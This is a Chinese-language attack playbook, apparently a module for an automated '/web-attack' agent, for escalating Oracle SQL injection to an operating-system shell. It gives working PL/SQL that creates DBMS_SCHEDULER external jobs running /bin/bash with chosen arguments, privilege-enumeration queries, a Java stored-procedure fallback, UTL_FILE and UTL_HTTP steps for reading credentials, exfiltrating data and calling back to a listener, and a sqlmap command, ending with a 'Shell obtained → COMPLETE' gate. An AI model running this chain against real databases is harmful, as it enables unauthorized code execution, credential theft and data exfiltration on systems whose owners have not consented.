# Oracle SQLi → Shell 完整攻击链

> 前置：已经通过 HTTP/Web 输入确认 SQL Injection，且后端指纹为 Oracle Database。
>
> 本文件只处理 **Oracle-backed SQLi → server-side execution/file/network primitive → Shell**。扫描发现 1521/TNS 后的直接服务攻击不属于 `/web-attack`。

---

## 第1步 身份、版本与权限枚举

```sql
SELECT USER FROM dual;
SELECT banner FROM v$version WHERE ROWNUM=1;
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual;
SELECT * FROM SESSION_PRIVS;
SELECT * FROM SESSION_ROLES;
```

重点关注：

```text
CREATE JOB
CREATE EXTERNAL JOB
CREATE ANY JOB
EXECUTE on DBMS_SCHEDULER
CREATE PROCEDURE / CREATE ANY PROCEDURE
Java/JVM相关权限和组件
UTL_FILE / Directory object权限
UTL_HTTP / UTL_TCP等网络访问能力
```

不要因为存在 `DBMS_SCHEDULER` 包就直接判断可执行 OS 命令。

---

## 第2步 路径选择

```text
CREATE JOB + CREATE EXTERNAL JOB（或等价高权限）
    → DBMS_SCHEDULER executable job

Oracle JVM存在 + 足够Java/Procedure权限
    → Java stored procedure fallback

文件/Directory权限
    → 读写应用配置 / 可消费文件

网络包权限
    → OOB / 内部HTTP / credential or management pivot

只有数据访问
    → 先扩大Web业务影响/凭据，再寻找Shell路径
```

---

## 第3步 DBMS_SCHEDULER External Job → OS Command

Oracle 外部 `EXECUTABLE` job 需要相应 Scheduler 权限；典型低层判断是 `CREATE JOB + CREATE EXTERNAL JOB`（或更高权限）。

### 最小验证

Linux 示例：

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name            => 'WEB_TEST_JOB',
    job_type            => 'EXECUTABLE',
    job_action          => '/usr/bin/id',
    number_of_arguments => 0,
    enabled             => TRUE,
    auto_drop           => FALSE
  );
END;
/
```

查看执行状态：

```sql
SELECT job_name,status,error#,additional_info
FROM user_scheduler_job_run_details
WHERE job_name='WEB_TEST_JOB'
ORDER BY log_date DESC;
```

### 带参数

需要参数时先禁用 job，设置参数后启用：

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name            => 'WEB_SHELL_JOB',
    job_type            => 'EXECUTABLE',
    job_action          => '/bin/bash',
    number_of_arguments => 2,
    enabled             => FALSE,
    auto_drop           => FALSE
  );

  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('WEB_SHELL_JOB',1,'-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE(
    'WEB_SHELL_JOB',2,'id > /tmp/web_sqli_oracle_test'
  );

  DBMS_SCHEDULER.ENABLE('WEB_SHELL_JOB');
END;
/
```

先用无害 marker/OOB 确认 OS command；靶场需要 Shell 时再替换第二个参数。

Windows 目标通过实际可执行文件（如 `cmd.exe` / PowerShell）启动命令，不要把 `.bat` 当直接 executable。

### 清理

```sql
BEGIN
  DBMS_SCHEDULER.DROP_JOB('WEB_TEST_JOB', force => TRUE);
END;
/

BEGIN
  DBMS_SCHEDULER.DROP_JOB('WEB_SHELL_JOB', force => TRUE);
END;
/
```

拿到 Shell 后 `/web-attack COMPLETE`。

---

## 第4步 Java Stored Procedure（fallback）

只有以下条件满足才继续：

```text
Oracle JVM组件存在
+
当前主体可创建/执行对应Java/Procedure对象
+
Java权限策略允许目标操作
```

先确认环境，不要把“Oracle + CREATE PROCEDURE”直接等同于 Java OS RCE。

测试思路：

```text
确认Java组件
→ 确认CREATE JAVA / CREATE PROCEDURE等权限
→ 最小无害执行/文件marker
→ 再评估OS command
→ Shell
```

如果 Java 组件缺失或权限不足，返回 Scheduler / file / network primitive，不要重复尝试同类 payload。

---

## 第5步 文件与网络 Primitive

### 文件

如果 SQLi 上下文拥有可用 Directory object / `UTL_FILE` 权限：

```text
读取应用配置/凭据
写入Web可消费目录
修改可被任务/应用加载的文件
```

文件读写只有能进一步形成执行/管理入口时才算 Shell 链。

### 网络/OOB

`UTL_HTTP` / `UTL_TCP` 等是否可用取决于 Oracle ACL 和授权。

用途：

```text
blind SQLi OOB确认
数据外带
内部HTTP服务探测
回连到受控监听
```

不要把网络 primitive 本身当成 Shell。

---

## 第6步 sqlmap 辅助

```bash
sqlmap -r request.txt -p id --dbms=Oracle --current-user --privileges --batch
```

已确认高权限后可让 sqlmap 评估 OS 能力，但失败时仍按本文件手工判断 Scheduler/JVM/文件/网络权限，不要把自动化失败当作链不存在。

---

## 成功门控

```text
Oracle SQLi
    ↓
SESSION_PRIVS / SESSION_ROLES
    ↓
Scheduler / Java / file-network primitive
    ↓
稳定OS command / 可执行Web入口
    ↓
Shell obtained
    ↓
/web-attack COMPLETE
```

TNS Poisoning、直接 1521 登录和 Oracle 服务枚举不属于本文件。
